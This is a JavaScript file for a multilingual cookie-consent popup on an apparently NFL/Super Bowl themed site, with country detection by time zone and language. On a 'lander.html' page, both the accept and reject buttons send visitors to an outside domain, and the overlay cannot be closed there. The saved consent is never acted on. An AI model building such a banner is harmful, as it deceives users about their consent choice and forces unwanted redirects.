(function () {
  var STORAGE_KEY = 'gfh_cookie_consent';
  var REDIRECT_URL = 'https://dailysource.online/'; // safer than example.com
  var isLander = window.location.pathname.indexOf('lander.html') !== -1;

  var countryConfig = {
    PL: {
      title: 'Dbamy o Twoją prywatność',
      text: 'Używamy plików cookie, aby poprawić komfort przeglądania, analizować treści NFL i spersonalizować informacje o Super Bowl. Klikając <strong>Akceptuj wszystko</strong>, wyrażasz zgodę na korzystanie z plików cookie.',
      accept: '✓ Akceptuj wszystko',
      reject: '✕ Odrzuć wszystko',
      policy: '<a href="privacy.html">Polityka prywatności</a> &nbsp;·&nbsp; <a href="terms.html">Regulamin</a>'
    },
    DE: {
      title: 'Wir schätzen Ihre Privatsphäre',
      text: 'Wir verwenden Cookies, um Ihr Surferlebnis zu verbessern, NFL-Inhalte zu analysieren und Ihre Super-Bowl-Berichterstattung zu personalisieren. Mit einem Klick auf <strong>Alle akzeptieren</strong> stimmen Sie der Verwendung von Cookies zu.',
      accept: '✓ Alle akzeptieren',
      reject: '✕ Alle ablehnen',
      policy: '<a href="privacy.html">Datenschutzerklärung</a> &nbsp;·&nbsp; <a href="terms.html">Nutzungsbedingungen</a>'
    },
    DK: {
      title: 'Vi værner om dit privatliv',
      text: 'Vi bruger cookies for at forbedre din browsingoplevelse, analysere NFL-indhold og tilpasse Super Bowl-dækningen til dig. Ved at klikke på <strong>Accepter alle</strong> accepterer du vores brug af cookies.',
      accept: '✓ Accepter alle',
      reject: '✕ Afvis alle',
      policy: '<a href="privacy.html">Privatlivspolitik</a> &nbsp;·&nbsp; <a href="terms.html">Vilkår og betingelser</a>'
    },
    PT: {
      title: 'Valorizamos a sua privacidade',
      text: 'Utilizamos cookies para melhorar a sua experiência de navegação, analisar conteúdos da NFL e personalizar a cobertura do Super Bowl. Ao clicar em <strong>Aceitar todos</strong>, concorda com a nossa utilização de cookies.',
      accept: '✓ Aceitar todos',
      reject: '✕ Rejeitar todos',
      policy: '<a href="privacy.html">Política de Privacidade</a> &nbsp;·&nbsp; <a href="terms.html">Termos de Serviço</a>'
    },
    HU: {
      title: 'Fontos számunkra az adatvédelem',
      text: 'Sütiket használunk a böngészési élmény javítására, az NFL-tartalmak elemzésére és a Super Bowl-közvetítés személyre szabására. Az <strong>Összes elfogadása</strong> gombra kattintva hozzájárulsz a sütik használatához.',
      accept: '✓ Összes elfogadása',
      reject: '✕ Összes elutasítása',
      policy: '<a href="privacy.html">Adatvédelmi irányelvek</a> &nbsp;·&nbsp; <a href="terms.html">Felhasználási feltételek</a>'
    },
    IT: {
      title: 'La tua privacy è importante',
      text: 'Utilizziamo i cookie per migliorare la tua navigazione, analizzare i contenuti NFL e personalizzare la copertura del Super Bowl. Cliccando su <strong>Accetta tutto</strong> acconsenti all\'uso dei cookie.',
      accept: '✓ Accetta tutto',
      reject: '✕ Rifiuta tutto',
      policy: '<a href="privacy.html">Informativa sulla Privacy</a> &nbsp;·&nbsp; <a href="terms.html">Termini di Servizio</a>'
    },
    AU: {
      title: 'We Value Your Privacy',
      text: 'We use cookies to enhance your browsing experience, analyse NFL content, and personalise your Super Bowl coverage. By clicking <strong>Accept All</strong>, you agree to our use of cookies.',
      accept: '✓ Accept All',
      reject: '✕ Reject All',
      policy: '<a href="privacy.html">Privacy Policy</a> &nbsp;·&nbsp; <a href="terms.html">Terms of Service</a>'
    },
    NO: {
      title: 'Vi verdsetter personvernet ditt',
      text: 'Vi bruker informasjonskapsler (cookies) for å forbedre nettleseropplevelsen din, analysere NFL-innhold og tilpasse Super Bowl-dekningen. Ved å klikke <strong>Godta alle</strong> godtar du bruken av informasjonskapsler.',
      accept: '✓ Godta alle',
      reject: '✕ Avvis alle',
      policy: '<a href="privacy.html">Personvernerklæring</a> &nbsp;·&nbsp; <a href="terms.html">Bruksvilkår</a>'
    },
    DEFAULT: {
      title: 'We Value Your Privacy',
      text: 'We use cookies to enhance your browsing experience, analyze NFL content, and personalize your Super Bowl coverage. By clicking <strong>Accept All</strong>, you agree to our use of cookies.',
      accept: '✓ Accept All',
      reject: '✕ Reject All',
      policy: '<a href="privacy.html">Privacy Policy</a> &nbsp;·&nbsp; <a href="terms.html">Terms of Service</a>'
    }
  };

  var tzMap = {
    "Europe/Berlin": "DE", "Europe/Frankfurt": "DE", "Europe/Munich": "DE",
    "Europe/Warsaw": "PL",
    "Europe/Copenhagen": "DK",
    "Europe/Lisbon": "PT", "Atlantic/Azores": "PT", "Atlantic/Madeira": "PT",
    "Europe/Budapest": "HU",
    "Europe/Rome": "IT", "Europe/Milan": "IT",
    "Australia/Sydney": "AU", "Australia/Melbourne": "AU", "Australia/Brisbane": "AU", "Australia/Perth": "AU", "Australia/Adelaide": "AU",
    "Europe/Oslo": "NO"
  };

  function getCountry() {
    try {
      var params = new URLSearchParams(window.location.search);
      var cParam = (params.get('country') || params.get('cc') || params.get('loc') || '').toUpperCase();
      if (cParam && countryConfig.hasOwnProperty(cParam)) return cParam;
    } catch (e) {}

    try {
      if (document.documentElement.dataset.country) {
        var dc = document.documentElement.dataset.country.toUpperCase();
        if (countryConfig.hasOwnProperty(dc)) return dc;
      }
    } catch (e) {}

    try {
      var ls = (localStorage.getItem('country') || '').toUpperCase();
      if (ls && countryConfig.hasOwnProperty(ls)) return ls;
    } catch (e) {}

    try {
      var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      if (tzMap[tz]) return tzMap[tz];
      var tl = tz.toLowerCase();
      if (tl.indexOf('berlin') !== -1 || tl.indexOf('frankfurt') !== -1 || tl.indexOf('munich') !== -1) return 'DE';
      if (tl.indexOf('warsaw') !== -1) return 'PL';
      if (tl.indexOf('copenhagen') !== -1) return 'DK';
      if (tl.indexOf('lisbon') !== -1 || tl.indexOf('madeira') !== -1 || tl.indexOf('azores') !== -1) return 'PT';
      if (tl.indexOf('budapest') !== -1) return 'HU';
      if (tl.indexOf('rome') !== -1 || tl.indexOf('milan') !== -1) return 'IT';
      if (tl.indexOf('sydney') !== -1 || tl.indexOf('melbourne') !== -1 || tl.indexOf('brisbane') !== -1 || tl.indexOf('perth') !== -1 || tl.indexOf('adelaide') !== -1) return 'AU';
      if (tl.indexOf('oslo') !== -1) return 'NO';
    } catch (e) {}

    try {
      var path = (location.pathname || '').toLowerCase();
      for (var k in countryConfig) {
        if (k === 'DEFAULT') continue;
        if (path.indexOf(k.toLowerCase()) !== -1) return k;
      }
    } catch (e) {}

    try {
      var lang = (navigator.language || '').toUpperCase();
      for (var kk in countryConfig) {
        if (kk === 'DEFAULT') continue;
        if (lang.indexOf(kk) !== -1 || lang.indexOf(kk.substring(0,2)) !== -1) return kk;
      }
    } catch (e) {}

    return 'DEFAULT';
  }

  (function showPopup() {
    var style = document.createElement('style');
    style.textContent = [
      '#gfh-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:99998;display:flex;align-items:center;justify-content:center;padding:1rem;animation:gfh-fadein 0.3s ease;}',
      '@keyframes gfh-fadein{from{opacity:0}to{opacity:1}}',
      '@keyframes gfh-popin{from{opacity:0;transform:scale(0.92) translateY(12px)}to{opacity:1;transform:scale(1) translateY(0)}}',
      '#gfh-popup{width:100%;max-width:480px;background:#fff;border-radius:16px;padding:2.2rem 2rem 2.4rem;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:gfh-popin 0.35s cubic-bezier(0.34,1.4,0.64,1);font-family:Arial,sans-serif;}',
      '#gfh-popup .gfh-icon{font-size:2.4rem;margin-bottom:0.7rem;display:block;text-align:center;}',
      '#gfh-popup h2{font-size:1.15rem;font-weight:700;color:#0d1115;text-align:center;margin:0 0 0.6rem;letter-spacing:-0.2px;}',
      '#gfh-popup p{font-size:0.85rem;color:#555;line-height:1.7;text-align:center;margin:0 0 1.6rem;}',
      '#gfh-popup p a{color:#79d260;text-decoration:underline;}',
      '#gfh-popup p a:hover{color:#0d1115;}',
      '#gfh-divider{border:none;border-top:1px solid #e8e8e8;margin:0 0 1.6rem;}',
      '#gfh-btns{display:flex;gap:0.75rem;justify-content:center;}',
      '#gfh-accept{flex:1;background:#7ad75a;color:#0a120e;border:none;padding:0.8rem 1.5rem;border-radius:8px;font-size:0.92rem;font-weight:800;cursor:pointer;transition:background 0.2s,transform 0.1s;letter-spacing:0.02em;}',
      '#gfh-accept:hover{background:#68c94a;transform:translateY(-1px);}',
      '#gfh-reject{flex:1;background:#fff;color:#0d1115;border:2px solid #0d1115;padding:0.8rem 1.5rem;border-radius:8px;font-size:0.92rem;font-weight:700;cursor:pointer;transition:all 0.2s;letter-spacing:0.02em;}',
      '#gfh-reject:hover{background:#eef6ee;transform:translateY(-1px);}',
      '#gfh-policy{display:block;text-align:center;margin-top:1rem;font-size:0.76rem;color:#999;}',
      '#gfh-policy a{color:#999;text-decoration:underline;}',
      '#gfh-policy a:hover{color:#1a6b38;}'
    ].join('');
    document.head.appendChild(style);

    var loc = getCountry();
    var t = countryConfig[loc] || countryConfig.DEFAULT;

    var overlay = document.createElement('div');
    overlay.id = 'gfh-overlay';
    overlay.innerHTML = [
      '<div id="gfh-popup">',
      '  <span class="gfh-icon">🍪</span>',
      '  <h2 id="gfh-title">' + t.title + '</h2>',
      '  <p id="gfh-text">' + t.text + '</p>',
      '  <hr id="gfh-divider">',
      '  <div id="gfh-btns">',
      '    <button id="gfh-accept">' + t.accept + '</button>',
      '    <button id="gfh-reject">' + t.reject + '</button>',
      '  </div>',
      '  <span id="gfh-policy">' + t.policy + '</span>',
      '</div>'
    ].join('');
    document.body.appendChild(overlay);

    function closePopup() {
      overlay.style.opacity = '0';
      overlay.style.transition = 'opacity 0.2s ease';
      setTimeout(function () { overlay.remove(); }, 200);
    }

    function handleAccept() {
      try { localStorage.setItem(STORAGE_KEY, 'accepted'); } catch (e) {}
      if (isLander) {
        window.location.href = REDIRECT_URL;
      } else {
        closePopup();
      }
    }

    function handleReject() {
      try { localStorage.setItem(STORAGE_KEY, 'rejected'); } catch (e) {}
      if (isLander) {
        window.location.href = REDIRECT_URL;
      } else {
        closePopup();
      }
    }

    document.getElementById('gfh-accept').addEventListener('click', handleAccept);
    document.getElementById('gfh-reject').addEventListener('click', handleReject);

    if (!isLander) {
      overlay.addEventListener('click', function (e) {
        if (e.target === overlay) closePopup();
      });
      document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') closePopup();
      });
    }
  })();
})();